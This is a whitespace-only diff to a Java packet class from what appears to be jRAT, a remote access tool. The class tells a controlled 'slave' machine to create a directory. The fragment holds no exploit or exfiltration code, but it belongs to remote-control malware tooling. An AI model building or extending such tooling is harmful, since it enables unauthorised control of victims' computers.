@@ -4,12 +4,11 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet43CreateDirectory extends AbstractOutgoingPacket {
-	
+
 	private String dir;
 	private String name;
-	
+
 	public Packet43CreateDirectory(String dir, String name) {
 		this.dir = dir;
 		this.name = name;
